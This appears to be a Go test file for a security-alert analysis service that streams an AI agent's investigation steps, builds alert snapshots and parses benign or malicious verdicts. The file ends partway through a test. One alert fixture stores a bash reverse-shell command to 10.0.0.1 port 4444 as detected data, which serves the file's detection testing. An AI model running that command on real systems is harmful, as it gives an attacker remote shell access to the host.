package handler

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/google/uuid"

	"api-server/internal/llm"
	"api-server/internal/model"
)

func TestSSEResponseCollectorKeepsReActTrace(t *testing.T) {
	recorder := httptest.NewRecorder()
	writer := &collectingSSEWriter{
		writer:    llm.NewSSEWriter(recorder),
		collector: &SSEResponseCollector{},
	}

	if err := writer.WriteThinking("先查询历史日志"); err != nil {
		t.Fatalf("write thinking: %v", err)
	}
	args := map[string]interface{}{
		"host_id":    "host-1",
		"start_time": "2026-04-24T00:00:00Z",
		"end_time":   "2026-04-24T01:00:00Z",
	}
	if err := writer.WriteToolCall("QueryHistoricalLogs", "call-1", args); err != nil {
		t.Fatalf("write tool call: %v", err)
	}
	result := map[string]interface{}{"count": 1}
	if err := writer.WriteToolResult("call-1", result, 12); err != nil {
		t.Fatalf("write tool result: %v", err)
	}
	if err := writer.WriteContent("Final Answer: 已确认威胁"); err != nil {
		t.Fatalf("write content: %v", err)
	}

	collector := writer.collector
	if got := collector.GetContent(); got != "Final Answer: 已确认威胁" {
		t.Fatalf("unexpected content: %q", got)
	}
	if !strings.Contains(collector.GetThinking(), "先查询历史日志") {
		t.Fatalf("thinking was not collected: %q", collector.GetThinking())
	}
	if len(collector.GetToolCalls()) != 1 {
		t.Fatalf("expected one tool call, got %d", len(collector.GetToolCalls()))
	}
	if len(collector.GetToolResults()) != 1 {
		t.Fatalf("expected one tool result, got %d", len(collector.GetToolResults()))
	}
	steps := collector.GetSteps()
	if len(steps) != 1 {
		t.Fatalf("expected one step, got %d", len(steps))
	}
	if steps[0].Action != "QueryHistoricalLogs" {
		t.Fatalf("unexpected action: %q", steps[0].Action)
	}
	if !strings.Contains(steps[0].Observation, "\"count\": 1") {
		t.Fatalf("unexpected observation: %q", steps[0].Observation)
	}
}

func TestSSEResponseCollectorHookMethodsBuildStepHistory(t *testing.T) {
	collector := &SSEResponseCollector{}

	collector.AddThinking("需要查询主机上的可疑进程树")
	collector.AddToolCall("GetProcessTree", "call-process-tree", `{"host_id":"host-1","pid":1234}`)
	collector.AddToolResult("call-process-tree", "发现 bash 由 sshd 拉起，并继续启动 curl")

	if !strings.Contains(collector.GetThinking(), "可疑进程树") {
		t.Fatalf("thinking was not collected: %q", collector.GetThinking())
	}

	steps := collector.GetSteps()
	if len(steps) != 1 {
		t.Fatalf("expected one reconstructed step, got %d", len(steps))
	}
	if steps[0].Action != "GetProcessTree" {
		t.Fatalf("unexpected action: %#v", steps[0])
	}
	if steps[0].ActionInput["host_id"] != "host-1" {
		t.Fatalf("expected JSON string args to be decoded, got %#v", steps[0].ActionInput)
	}
	if !strings.Contains(steps[0].Observation, "bash") {
		t.Fatalf("unexpected observation: %q", steps[0].Observation)
	}
}

func TestPauseAnalysisCancelsActiveRun(t *testing.T) {
	gin.SetMode(gin.TestMode)
	handler := NewAIAnalysisHandler(nil, nil, nil, nil, nil, nil, nil, nil, nil, nil)
	cancelled := false
	handler.setActiveRun("session-1", func() {
		cancelled = true
	})

	router := gin.New()
	router.POST("/ai/:session_id/pause", handler.PauseAnalysis)

	req := httptest.NewRequest(http.MethodPost, "/ai/session-1/pause", nil)
	recorder := httptest.NewRecorder()
	router.ServeHTTP(recorder, req)

	if recorder.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d body=%s", recorder.Code, recorder.Body.String())
	}
	if !cancelled {
		t.Fatal("expected active run cancel func to be called")
	}
	if handler.hasActiveRun("session-1") {
		t.Fatal("expected active run to be removed after pause")
	}
}

func TestCollectingSSEWriterWritesFlowchartImageBeforeDone(t *testing.T) {
	recorder := httptest.NewRecorder()
	writer := &collectingSSEWriter{
		writer:    llm.NewSSEWriter(recorder),
		collector: &SSEResponseCollector{},
		beforeDone: func(content string) error {
			if content != "Final Answer: 已确认威胁" {
				t.Fatalf("unexpected final content passed to image callback: %q", content)
			}
			return llm.NewSSEWriter(recorder).Write(llm.SSEEvent{
				Type: "flowchart_image",
				Result: map[string]interface{}{
					"url": "https://example.test/trace.png",
				},
			})
		},
	}

	if err := writer.WriteContent("Final Answer: 已确认威胁"); err != nil {
		t.Fatalf("write content: %v", err)
	}
	if err := writer.WriteDone(); err != nil {
		t.Fatalf("write done: %v", err)
	}

	body := recorder.Body.String()
	imageIdx := strings.Index(body, `"type":"flowchart_image"`)
	doneIdx := strings.Index(body, `"type":"done"`)
	if imageIdx < 0 {
		t.Fatalf("expected flowchart_image event in SSE body: %s", body)
	}
	if doneIdx < 0 {
		t.Fatalf("expected done event in SSE body: %s", body)
	}
	if imageIdx > doneIdx {
		t.Fatalf("expected flowchart_image before done, body: %s", body)
	}
}

func TestCollectingSSEWriterCompactsLargeToolResult(t *testing.T) {
	recorder := httptest.NewRecorder()
	writer := &collectingSSEWriter{
		writer:    llm.NewSSEWriter(recorder),
		collector: &SSEResponseCollector{},
	}

	logs := make([]interface{}, 0, 100)
	for i := 0; i < 100; i++ {
		logs = append(logs, map[string]interface{}{
			"message": strings.Repeat("x", 2000),
			"source":  "/var/log/test.log",
		})
	}
	result := map[string]interface{}{
		"count": 100,
		"logs":  logs,
	}

	if err := writer.WriteToolResult("call-large", result, 42); err != nil {
		t.Fatalf("write tool result: %v", err)
	}

	body := recorder.Body.String()
	if len(body) > maxToolResultEventBytes+2048 {
		t.Fatalf("SSE payload was not compacted enough, got %d bytes", len(body))
	}
	if !strings.Contains(body, "omitted_items") {
		t.Fatalf("expected truncation metadata in SSE payload: %s", body)
	}

	results := writer.collector.GetToolResults()
	if len(results) != 1 {
		t.Fatalf("expected one collected result, got %d", len(results))
	}
	data, err := json.Marshal(results[0]["result"])
	if err != nil {
		t.Fatalf("marshal collected result: %v", err)
	}
	if len(data) > maxToolResultEventBytes {
		t.Fatalf("collected result was not compacted, got %d bytes", len(data))
	}
}

func TestNormalizeAnalysisMaxIterationsCapsRunawaySessions(t *testing.T) {
	if got := normalizeAnalysisMaxIterations(0); got != defaultAnalysisMaxIterations {
		t.Fatalf("expected default iterations, got %d", got)
	}
	if got := normalizeAnalysisMaxIterations(999); got != 100 {
		t.Fatalf("expected capped iterations to 100, got %d", got)
	}
	if got := normalizeAnalysisMaxIterations(3); got != 3 {
		t.Fatalf("expected explicit iterations to be preserved, got %d", got)
	}
}

func TestIsPlaceholderToolValue(t *testing.T) {
	for _, value := range []string{"", "...", "<host_id>", "[the host id]"} {
		if !isPlaceholderToolValue(value) {
			t.Fatalf("expected %q to be treated as placeholder", value)
		}
	}
	if isPlaceholderToolValue("d5de931d-685a-4bca-92f2-8287b7f903bf") {
		t.Fatal("expected real host id not to be treated as placeholder")
	}
}

func TestBuildSessionContextIncludesAlertSnapshots(t *testing.T) {
	handler := &AIAnalysisHandler{}
	start := time.Date(2026, 4, 28, 1, 0, 0, 0, time.UTC)
	end := time.Date(2026, 4, 28, 2, 0, 0, 0, time.UTC)
	session := &AISSESion{
		AlertIDs:   []string{"internal-1"},
		HostIDs:    []string{"host-1"},
		HostFilter: []string{"host-a"},
		TimeRange: &TimeRange{
			Start: start,
			End:   end,
		},
		AlertSnapshots: []AlertContextSnapshot{
			{
				ID:          "internal-1",
				AlertID:     "ALT-001",
				HostID:      "host-1",
				Hostname:    "host-a",
				RuleTitle:   "可疑进程执行",
				Severity:    "high",
				Status:      "pending",
				Description: "bash 启动异常子进程",
				ProcessTree: `{"pid":1234}`,
				FirstSeenAt: start,
				LastSeenAt:  end,
			},
		},
	}

	context := handler.buildSessionContext(session)
	alerts, ok := context["alerts"].([]AlertContextSnapshot)
	if !ok {
		t.Fatalf("expected alerts in context, got %#v", context["alerts"])
	}
	if len(alerts) != 1 {
		t.Fatalf("expected one alert snapshot, got %d", len(alerts))
	}
	if alerts[0].AlertID != "ALT-001" || alerts[0].RuleTitle != "可疑进程执行" {
		t.Fatalf("unexpected alert snapshot: %#v", alerts[0])
	}
}

func TestBuildAlertSnapshotsIncludesAllFields(t *testing.T) {
	blockStatus := "blocked"
	now := time.Date(2026, 5, 12, 10, 0, 0, 0, time.UTC)
	createdAt := time.Date(2026, 5, 12, 9, 0, 0, 0, time.UTC)
	alertID := uuid.New()
	hostID := uuid.New()

	alerts := []model.Alert{
		{
			ID:                  alertID,
			AlertID:             "ALT-TEST-001",
			HostID:              hostID,
			Hostname:            "web-server-01",
			PID:                 12345,
			PPID:                678,
			CommandLine:         "/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
			ProcessTree:         `{"pid":12345,"name":"bash","children":[]}`,
			MitreID:             "T1059.004",
			MitreName:           "Unix Shell",
			Severity:            "critical",
			Description:         "检测到反弹 shell 行为",
			LLMSummary:          "疑似反弹 shell 攻击",
			DedupeKey:           "dedupe-key-001",
			HitCount:            5,
			AutoBlocked:         true,
			ManualBlocked:       false,
			Status:              "confirmed",
			BlockStatus:         &blockStatus,
			BlockMessage:        "已自动阻断外联",
			LLMDisposalStrategy: "隔离主机并封禁 IP",
			RuleID:              "rule-001",
			RuleTitle:           "反弹 Shell 检测",
			FirstSeenAt:         now,
			LastSeenAt:          now,
			CreatedAt:           createdAt,
		},
	}

	snapshots := buildAlertSnapshots(alerts)
	if len(snapshots) != 1 {
		t.Fatalf("expected 1 snapshot, got %d", len(snapshots))
	}

	s := snapshots[0]

	// 验证原有字段
	if s.ID != alertID.String() {
		t.Errorf("ID = %q, want %q", s.ID, alertID.String())
	}
	if s.AlertID != "ALT-TEST-001" {
		t.Errorf("AlertID = %q, want %q", s.AlertID, "ALT-TEST-001")
	}
	if s.HostID != hostID.String() {
		t.Errorf("HostID = %q, want %q", s.HostID, hostID.String())
	}
	if s.Hostname != "web-server-01" {
		t.Errorf("Hostname = %q, want %q", s.Hostname, "web-server-01")
	}
	if s.RuleTitle != "反弹 Shell 检测" {
		t.Errorf("RuleTitle = %q, want %q", s.RuleTitle, "反弹 Shell 检测")
	}
	if s.MitreID != "T1059.004" {
		t.Errorf("MitreID = %q, want %q", s.MitreID, "T1059.004")
	}
	if s.Severity != "critical" {
		t.Errorf("Severity = %q, want %q", s.Severity, "critical")
	}
	if s.Status != "confirmed" {
		t.Errorf("Status = %q, want %q", s.Status, "confirmed")
	}
	if s.Description != "检测到反弹 shell 行为" {
		t.Errorf("Description = %q, want %q", s.Description, "检测到反弹 shell 行为")
	}
	if s.ProcessTree != `{"pid":12345,"name":"bash","children":[]}` {
		t.Errorf("ProcessTree = %q, want expected value", s.ProcessTree)
	}
	if s.LLMSummary != "疑似反弹 shell 攻击" {
		t.Errorf("LLMSummary = %q, want %q", s.LLMSummary, "疑似反弹 shell 攻击")
	}

	// 验证新增字段
	if s.PID != 12345 {
		t.Errorf("PID = %d, want 12345", s.PID)
	}
	if s.PPID != 678 {
		t.Errorf("PPID = %d, want 678", s.PPID)
	}
	if s.CommandLine != "/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" {
		t.Errorf("CommandLine = %q, want expected value", s.CommandLine)
	}
	if s.MitreName != "Unix Shell" {
		t.Errorf("MitreName = %q, want %q", s.MitreName, "Unix Shell")
	}
	if s.RuleID != "rule-001" {
		t.Errorf("RuleID = %q, want %q", s.RuleID, "rule-001")
	}
	if s.HitCount != 5 {
		t.Errorf("HitCount = %d, want 5", s.HitCount)
	}
	if !s.AutoBlocked {
		t.Error("AutoBlocked should be true")
	}
	if s.ManualBlocked {
		t.Error("ManualBlocked should be false")
	}
	if s.BlockStatus != "blocked" {
		t.Errorf("BlockStatus = %q, want %q", s.BlockStatus, "blocked")
	}
	if s.BlockMessage != "已自动阻断外联" {
		t.Errorf("BlockMessage = %q, want %q", s.BlockMessage, "已自动阻断外联")
	}
	if s.LLMDisposalStrategy != "隔离主机并封禁 IP" {
		t.Errorf("LLMDisposalStrategy = %q, want %q", s.LLMDisposalStrategy, "隔离主机并封禁 IP")
	}
	if s.CreatedAt != createdAt {
		t.Errorf("CreatedAt = %v, want %v", s.CreatedAt, createdAt)
	}
}

func TestBuildAlertSnapshotsMapsNilBlockStatusToEmptyString(t *testing.T) {
	alerts := []model.Alert{
		{
			ID:          uuid.New(),
			AlertID:     "ALT-002",
			HostID:      uuid.New(),
			Hostname:    "db-server-01",
			PID:         999,
			PPID:        1,
			CommandLine: "/usr/sbin/mysqld",
			Severity:    "medium",
			Status:      "pending",
			RuleTitle:   "异常数据库连接",
			FirstSeenAt: time.Now(),
			LastSeenAt:  time.Now(),
		},
	}

	snapshots := buildAlertSnapshots(alerts)
	if len(snapshots) != 1 {
		t.Fatalf("expected 1 snapshot, got %d", len(snapshots))
	}

	// BlockStatus 为 nil 时应映射为空字符串
	if snapshots[0].BlockStatus != "" {
		t.Errorf("BlockStatus = %q, want empty string for nil BlockStatus", snapshots[0].BlockStatus)
	}
}

func TestBuildSessionContextIncludesNewAlertFields(t *testing.T) {
	handler := &AIAnalysisHandler{}
	start := time.Date(2026, 5, 12, 1, 0, 0, 0, time.UTC)
	end := time.Date(2026, 5, 12, 2, 0, 0, 0, time.UTC)
	createdAt := time.Date(2026, 5, 12, 0, 30, 0, 0, time.UTC)

	session := &AISSESion{
		AlertIDs:   []string{"internal-1"},
		HostIDs:    []string{"host-1"},
		HostFilter: []string{"host-a"},
		TimeRange: &TimeRange{
			Start: start,
			End:   end,
		},
		AlertSnapshots: []AlertContextSnapshot{
			{
				ID:                  "internal-1",
				AlertID:             "ALT-001",
				HostID:              "host-1",
				Hostname:            "host-a",
				RuleTitle:           "可疑进程执行",
				Severity:            "high",
				Status:              "pending",
				Description:         "bash 启动异常子进程",
				ProcessTree:         `{"pid":1234}`,
				FirstSeenAt:         start,
				LastSeenAt:          end,
				PID:                 1234,
				PPID:                567,
				CommandLine:         "/bin/bash -c whoami",
				MitreName:           "Unix Shell",
				RuleID:              "rule-100",
				HitCount:            3,
				AutoBlocked:         true,
				BlockStatus:         "blocked",
				BlockMessage:        "已阻断",
				LLMDisposalStrategy: "建议隔离",
				CreatedAt:           createdAt,
			},
		},
	}

	context := handler.buildSessionContext(session)
	alerts, ok := context["alerts"].([]AlertContextSnapshot)
	if !ok {
		t.Fatalf("expected alerts in context, got %#v", context["alerts"])
	}
	if len(alerts) != 1 {
		t.Fatalf("expected one alert snapshot, got %d", len(alerts))
	}

	s := alerts[0]
	if s.PID != 1234 {
		t.Errorf("context alert PID = %d, want 1234", s.PID)
	}
	if s.PPID != 567 {
		t.Errorf("context alert PPID = %d, want 567", s.PPID)
	}
	if s.CommandLine != "/bin/bash -c whoami" {
		t.Errorf("context alert CommandLine = %q, want expected", s.CommandLine)
	}
	if s.MitreName != "Unix Shell" {
		t.Errorf("context alert MitreName = %q, want %q", s.MitreName, "Unix Shell")
	}
	if s.RuleID != "rule-100" {
		t.Errorf("context alert RuleID = %q, want %q", s.RuleID, "rule-100")
	}
	if s.HitCount != 3 {
		t.Errorf("context alert HitCount = %d, want 3", s.HitCount)
	}
	if !s.AutoBlocked {
		t.Error("context alert AutoBlocked should be true")
	}
	if s.BlockStatus != "blocked" {
		t.Errorf("context alert BlockStatus = %q, want %q", s.BlockStatus, "blocked")
	}
	if s.LLMDisposalStrategy != "建议隔离" {
		t.Errorf("context alert LLMDisposalStrategy = %q, want %q", s.LLMDisposalStrategy, "建议隔离")
	}
}

func TestSSEWriterErrorFollowedByDone(t *testing.T) {
	recorder := httptest.NewRecorder()
	writer := llm.NewSSEWriter(recorder)

	// 模拟 runtime 错误路径：先写 error，再写 done
	if err := writer.WriteError("agent runtime error: connection refused"); err != nil {
		t.Fatalf("WriteError: %v", err)
	}
	if err := writer.WriteDone(); err != nil {
		t.Fatalf("WriteDone: %v", err)
	}

	body := recorder.Body.String()

	// 验证 error 事件存在
	if !strings.Contains(body, `"type":"error"`) {
		t.Fatalf("expected error event in SSE body: %s", body)
	}
	if !strings.Contains(body, "agent runtime error: connection refused") {
		t.Fatalf("expected error message in SSE body: %s", body)
	}

	// 验证 done 事件存在
	if !strings.Contains(body, `"type":"done"`) {
		t.Fatalf("expected done event after error in SSE body: %s", body)
	}

	// 验证 done 在 error 之后
	errorIdx := strings.Index(body, `"type":"error"`)
	doneIdx := strings.Index(body, `"type":"done"`)
	if doneIdx < errorIdx {
		t.Fatalf("done event should come after error event, body: %s", body)
	}
}

func TestExtractFinalAnswerResultParsesConclusions(t *testing.T) {
	content := `Final Answer:
{
  "attack_graph": {
    "graphId": "graph_1",
    "title": "反弹Shell攻击链路溯源",
    "summary": "攻击者通过 bash 执行反弹 shell",
    "threatLevel": "high",
    "nodes": [],
    "edges": [],
    "timeline": [],
    "recommendations": ["隔离主机", "阻断外联"]
  },
  "conclusions": [
    {"alert_id": "ALT-001", "action": "confirm_threat", "summary": "确认存在反弹 shell 行为"}
  ]
}`

	result, err := extractFinalAnswerResult(content)
	if err != nil {
		t.Fatalf("expected final answer to parse: %v", err)
	}
	if attackGraphStringField(result.AttackGraph, "title") != "反弹Shell攻击链路溯源" {
		t.Fatalf("unexpected graph title: %#v", result.AttackGraph)
	}
	if _, ok := result.AttackGraph["nodes"]; !ok {
		t.Fatalf("expected full attack graph JSON to be preserved: %#v", result.AttackGraph)
	}
	if len(result.Conclusions) != 1 {
		t.Fatalf("expected one conclusion, got %d", len(result.Conclusions))
	}
	if result.Conclusions[0].Summary != "确认存在反弹 shell 行为" {
		t.Fatalf("unexpected conclusion summary: %#v", result.Conclusions[0])
	}
}

func TestBuildAlertWritebackUsesConclusionSummaryAndRecommendations(t *testing.T) {
	session := &AISSESion{
		AlertSnapshots: []AlertContextSnapshot{
			{
				ID:        "internal-1",
				AlertID:   "ALT-001",
				Hostname:  "host-a",
				RuleTitle: "可疑外联",
			},
		},
	}
	result := &finalAnswerResult{
		AttackGraph: map[string]interface{}{
			"summary":         "攻击者建立了可疑外联",
			"recommendations": []interface{}{"立即隔离主机", "封禁目标 IP"},
		},
		Conclusions: []AlertConclusion{
			{AlertID: "ALT-001", Action: "confirm_threat", Summary: "确认该告警为真实入侵行为"},
		},
	}

	writebacks := buildAlertWritebacks(session, result)
	if len(writebacks) != 1 {
		t.Fatalf("expected one writeback, got %d", len(writebacks))
	}
	if writebacks[0].AlertID != "ALT-001" {
		t.Fatalf("unexpected alert id: %#v", writebacks[0])
	}
	if writebacks[0].Summary != "确认该告警为真实入侵行为" {
		t.Fatalf("unexpected summary: %#v", writebacks[0])
	}
	if writebacks[0].DisposalStrategy != "立即隔离主机；封禁目标 IP" {
		t.Fatalf("unexpected disposal strategy: %#v", writebacks[0])
	}
}

func TestIsAllFalsePositive_AllFalsePositive(t *testing.T) {
	content := `{
		"attack_graph": {"nodes": [], "edges": []},
		"conclusions": [
			{"alert_id": "ALT-001", "action": "mark_false_positive", "summary": "误报1"},
			{"alert_id": "ALT-002", "action": "mark_false_positive", "summary": "误报2"}
		]
	}`
	if !isAllFalsePositive(content) {
		t.Fatal("expected all false positive to return true")
	}
}

func TestIsAllFalsePositive_MixedActions(t *testing.T) {
	content := `{
		"attack_graph": {"nodes": [], "edges": []},
		"conclusions": [
			{"alert_id": "ALT-001", "action": "mark_false_positive", "summary": "误报"},
			{"alert_id": "ALT-002", "action": "confirm_threat", "summary": "确认威胁"}
		]
	}`
	if isAllFalsePositive(content) {
		t.Fatal("expected mixed actions to return false")
	}
}

func TestIsAllFalsePositive_ConfirmThreat(t *testing.T) {
	content := `{
		"attack_graph": {"nodes": [], "edges": []},
		"conclusions": [
			{"alert_id": "ALT-001", "action": "confirm_threat", "summary": "确认威胁"}
		]
	}`
	if isAllFalsePositive(content) {
		t.Fatal("expected confirm_threat to return false")
	}
}

func TestIsAllFalsePositive_EmptyConclusions(t *testing.T) {
	content := `{
		"attack_graph": {"nodes": [], "edges": []},
		"conclusions": []
	}`
	if isAllFalsePositive(content) {
		t.Fatal("expected empty conclusions to return false")
	}
}

func TestIsAllFalsePositive_InvalidJSON(t *testing.T) {
	if isAllFalsePositive("not json at all") {
		t.Fatal("expected invalid JSON to return false")
	}
}

func TestIsAllFalsePositive_GenerateRule(t *testing.T) {
	content := `{
		"conclusions": [
			{"alert_id": "ALT-001", "action": "generate_rule", "summary": "生成规则"}
		]
	}`
	if isAllFalsePositive(content) {
		t.Fatal("expected generate_rule to return false")
	}
}

func TestBuildExecutionResultResponse(t *testing.T) {
	execID := uuid.New()
	exec := &model.AgentExecution{
		ID:              execID,
		SessionID:       "session-1",
		TaskID:          "task-1",
		Status:          "completed",
		ExitReason:      "normal_completed",
		FinalAnswer:     "Benign / False Positive: 目标进程已退出",
		TotalDurationMs: 330000,
		StartedAt:       time.Now().Add(-5 * time.Minute),
		EndedAt:         time.Now(),
	}

	steps := []*model.AgentStepExecution{
		{
			ExecutionID: execID,
			StepID:      "step_1",
			Status:      "completed",
			Result:      "Process 4181522 (base64 -d) has exited",
			DurationMs:  5000,
		},
		{
			ExecutionID: execID,
			StepID:      "step_2",
			Status:      "completed",
			Result:      "经分析，目标进程已退出且未留下任何活跃文件句柄",
			DurationMs:  75000,
		},
	}

	response := buildExecutionResultResponse(exec, steps, nil)

	if response["status"] != "已完成" {
		t.Fatalf("expected status '已完成', got %v", response["status"])
	}
	if response["exit_reason"] != "正常完成" {
		t.Fatalf("expected exit_reason '正常完成', got %v", response["exit_reason"])
	}
	if response["total_duration_ms"] != int64(330000) {
		t.Fatalf("expected total_duration_ms 330000, got %v", response["total_duration_ms"])
	}

	stepList, ok := response["steps"].([]map[string]interface{})
	if !ok {
		t.Fatalf("expected steps to be a slice, got %T", response["steps"])
	}
	if len(stepList) != 2 {
		t.Fatalf("expected 2 steps, got %d", len(stepList))
	}
	if stepList[0]["step_id"] != "step_1" {
		t.Fatalf("expected first step_id 'step_1', got %v", stepList[0]["step_id"])
	}
	if stepList[0]["status"] != "已完成" {
		t.Fatalf("expected first step status '已完成', got %v", stepList[0]["status"])
	}

	conclusion, ok := response["conclusion"].(map[string]interface{})
	if !ok {
		t.Fatalf("expected conclusion to be a map, got %T", response["conclusion"])
	}
	if conclusion["verdict"] != "benign" {
		t.Fatalf("expected verdict 'benign', got %v", conclusion["verdict"])
	}
	if conclusion["summary"] != "良性/误报" {
		t.Fatalf("expected summary '良性/误报', got %v", conclusion["summary"])
	}
}

func TestParseConclusionFromAnswer_Benign(t *testing.T) {
	conclusion := parseConclusionFromAnswer("Benign / False Positive: 目标进程已退出")
	if conclusion["verdict"] != "benign" {
		t.Fatalf("expected verdict 'benign', got %v", conclusion["verdict"])
	}
	if conclusion["summary"] != "良性/误报" {
		t.Fatalf("expected summary '良性/误报', got %v", conclusion["summary"])
	}
}

func TestParseConclusionFromAnswer_Malicious(t *testing.T) {
	conclusion := parseConclusionFromAnswer("Malicious: 检测到反弹Shell行为")
	if conclusion["verdict"] != "malicious" {
		t.Fatalf("expected verdict 'malicious', got %v", conclusion["verdict"])
	}
	if conclusion["summary"] != "恶意" {
		t.Fatalf("expected summary '恶意', got %v", conclusion["summary"])
	}
}

func TestParseConclusionFromAnswer_Empty(t *testing.T) {
	conclusion := parseConclusionFromAnswer("")
	if conclusion["verdict"] != "unknown" {
		t.Fatalf("expected verdict 'unknown', got %v", conclusion["verdict"])
	}
	if conclusion["summary"] != "未生成结论" {
		t.Fatalf("expected summary '未生成结论', got %v", conclusion["summary"])
	}
}

func TestExtractErrorsFromExecution(t *testing.T) {
	exec := &model.AgentExecution{
		Completion: map[string]interface{}{
			"errors": []interface{}{
				"open /proc/4181522/stat: no such file or directory",
				"process 4181522 not found",
			},
		},
	}

	errors := extractErrorsFromExecution(exec)
	if len(errors) != 2 {
		t.Fatalf("expected 2 errors, got %d", len(errors))
	}
	if errors[0] != "open /proc/4181522/stat: no such file or directory" {
		t.Fatalf("unexpected first error: %s", errors[0])
	}
}

func TestExtractErrorsFromExecution_NoErrors(t *testing.T) {
	exec := &model.AgentExecution{
		Completion: map[string]interface{}{},
	}

	errors := extractErrorsFromExecution(exec)
	if len(errors) != 0 {
		t.Fatalf("expected 0 errors, got %d", len(errors))
	}
}

// ---------------------------------------------------------------------------
// parseConclusionFromAnswer: Structured JSON verdict tests
// ---------------------------------------------------------------------------

func TestParseConclusionFromAnswer_StructuredJSON_ConfirmThreat(t *testing.T) {
	content := `{
  "attack_graph": {
    "summary": "攻击者通过 bash 执行反弹 shell",
    "threat_level": "high",
    "recommendations": ["隔离主机"]
  },
  "conclusions": [
    {"alert_id": "ALT-001", "action": "confirm_threat", "summary": "确认存在反弹 shell 行为"}
  ]
}`
	conclusion := parseConclusionFromAnswer(content)
	if conclusion["verdict"] != "malicious" {
		t.Fatalf("expected verdict 'malicious', got %v", conclusion["verdict"])
	}
	if conclusion["summary"] != "确认存在反弹 shell 行为" {
		t.Fatalf("expected summary from conclusion, got %v", conclusion["summary"])
	}
}

func TestParseConclusionFromAnswer_StructuredJSON_MarkFalsePositive(t *testing.T) {
	content := `{
  "attack_graph": {"summary": "分析完成"},
  "conclusions": [
    {"alert_id": "ALT-002", "action": "mark_false_positive", "summary": "该告警为正常运维操作"}
  ]
}`
	conclusion := parseConclusionFromAnswer(content)
	if conclusion["verdict"] != "benign" {
		t.Fatalf("expected verdict 'benign', got %v", conclusion["verdict"])
	}
	if conclusion["summary"] != "该告警为正常运维操作" {
		t.Fatalf("expected summary from conclusion, got %v", conclusion["summary"])
	}
}

func TestParseConclusionFromAnswer_StructuredJSON_GenerateRule(t *testing.T) {
	content := `{
  "attack_graph": {"summary": "发现可疑模式"},
  "conclusions": [
    {"alert_id": "ALT-003", "action": "generate_rule", "summary": "建议生成新检测规则"}
  ]
}`
	conclusion := parseConclusionFromAnswer(content)
	if conclusion["verdict"] != "suspicious" {
		t.Fatalf("expected verdict 'suspicious', got %v", conclusion["verdict"])
	}
	if conclusion["summary"] != "建议生成新检测规则" {
		t.Fatalf("expected summary from conclusion, got %v", conclusion["summary"])
	}
}

func TestParseConclusionFromAnswer_StructuredJSON_MultipleConclusions(t *testing.T) {
	content := `{
  "attack_graph": {"summary": "多告警分析"},
  "conclusions": [
    {"alert_id": "ALT-001", "action": "mark_false_positive", "summary": "误报"},
    {"alert_id": "ALT-002", "action": "confirm_threat", "summary": "确认反弹 shell"},
    {"alert_id": "ALT-003", "action": "generate_rule", "summary": "建议生成规则"}
  ]
}`
	conclusion := parseConclusionFromAnswer(content)
	// Multiple conclusions: take most severe (malicious > suspicious > benign)
	if conclusion["verdict"] != "malicious" {
		t.Fatalf("expected verdict 'malicious' (most severe), got %v", conclusion["verdict"])
	}
	// Summary should be the first non-empty conclusion summary
	if conclusion["summary"] != "误报" {
		t.Fatalf("expected summary from first conclusion, got %v", conclusion["summary"])
	}
}

func TestParseConclusionFromAnswer_StructuredJSON_WithMarkdownPrefix(t *testing.T) {
	content := "Final Answer:\n```json\n{\n  \"attack_graph\": {\"summary\": \"分析\"},\n  \"conclusions\": [\n    {\"alert_id\": \"ALT-001\", \"action\": \"confirm_threat\", \"summary\": \"确认威胁\"}\n  ]\n}\n```"
	conclusion := parseConclusionFromAnswer(content)
	if conclusion["verdict"] != "malicious" {
		t.Fatalf("expected verdict 'malicious', got %v", conclusion["verdict"])
	}
	if conclusion["summary"] != "确认威胁" {
		t.Fatalf("expected summary from conclusion, got %v", conclusion["summary"])
	}
}

func TestParseConclusionFromAnswer_StructuredJSON_EmptyConclusions(t *testing.T) {
	content := `{
  "attack_graph": {"summary": "分析完成"},
  "conclusions": []
}`
	conclusion := parseConclusionFromAnswer(content)
	// Empty conclusions should fall through to keyword matching
	if conclusion["verdict"] != "unknown" {
		t.Fatalf("expected verdict 'unknown' for empty conclusions, got %v", conclusion["verdict"])
	}
}

func TestParseConclusionFromAnswer_ChineseKeywords(t *testing.T) {
	tests := []struct {
		input string
		want  string
	}{
		{"该行为属于误报", "benign"},
		{"良性：正常运维操作", "benign"},
		{"确认恶意攻击行为", "malicious"},
		{"检测到可疑外联", "suspicious"},
	}
	for _, tt := range tests {
		conclusion := parseConclusionFromAnswer(tt.input)
		if conclusion["verdict"] != tt.want {
			t.Errorf("input %q: expected verdict %q, got %v", tt.input, tt.want, conclusion["verdict"])
		}
	}
}

func TestParseConclusionFromAnswer_UnknownWithContent(t *testing.T) {
	content := "分析过程中遇到了异常情况，无法形成明确结论"
	conclusion := parseConclusionFromAnswer(content)
	if conclusion["verdict"] != "unknown" {
		t.Fatalf("expected verdict 'unknown', got %v", conclusion["verdict"])
	}
	// Should include the actual content as summary, not "未生成结论"
	if conclusion["summary"] == "未生成结论" {
		t.Fatalf("expected summary to contain actual content, got %v", conclusion["summary"])
	}
	if !strings.Contains(conclusion["summary"].(string), "分析过程中") {
		t.Fatalf("expected summary to include input text, got %v", conclusion["summary"])
	}
}

func TestBuildExecutionResultResponse_StructuredJSON(t *testing.T) {
	execID := uuid.New()
	exec := &model.AgentExecution{
		ID:              execID,
		SessionID:       "session-1",
		TaskID:          "task-1",
		Status:          "completed",
		ExitReason:      "normal_completed",
		FinalAnswer:     `{"attack_graph":{"summary":"攻击链分析"},"conclusions":[{"alert_id":"ALT-001","action":"confirm_threat","summary":"确认反弹shell攻击"}]}`,
		TotalDurationMs: 330000,
		StartedAt:       time.Now().Add(-5 * time.Minute),
		EndedAt:         time.Now(),
	}

	response := buildExecutionResultResponse(exec, nil, nil)

	conclusion, ok := response["conclusion"].(map[string]interface{})
	if !ok {
		t.Fatalf("expected conclusion to be a map, got %T", response["conclusion"])
	}
	if conclusion["verdict"] != "malicious" {
		t.Fatalf("expected verdict 'malicious', got %v", conclusion["verdict"])
	}
	if conclusion["summary"] != "确认反弹shell攻击" {
		t.Fatalf("expected AI-generated summary, got %v", conclusion["summary"])
	}
}

func TestParseConclusionFromAnswer_MultiKeywordDeterministic(t *testing.T) {
	// When text contains both "误报" (benign, severity 0) and "恶意" (malicious, severity 2),
	// should always pick "malicious" (most severe wins)
